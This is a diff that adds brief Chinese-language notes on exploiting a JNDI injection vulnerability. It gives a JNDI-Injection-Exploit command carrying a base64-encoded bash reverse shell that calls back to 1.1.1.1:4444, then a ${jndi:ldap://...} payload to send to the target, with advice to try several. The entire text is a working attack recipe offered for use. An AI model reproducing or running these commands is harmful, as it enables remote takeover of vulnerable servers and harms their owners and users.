@@ -1,0 +1,14 @@
+①
+
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" -A "1.1.1.1"
+
+base64编码反弹shell脚本。-A参数接vps地址
+
+
+②
+
+发送payload：
+
+${jndi:ldap://1.1.1.1:1389/fg9p02}
+
+该payload由jndi注入工具生成，尽量多尝试几个
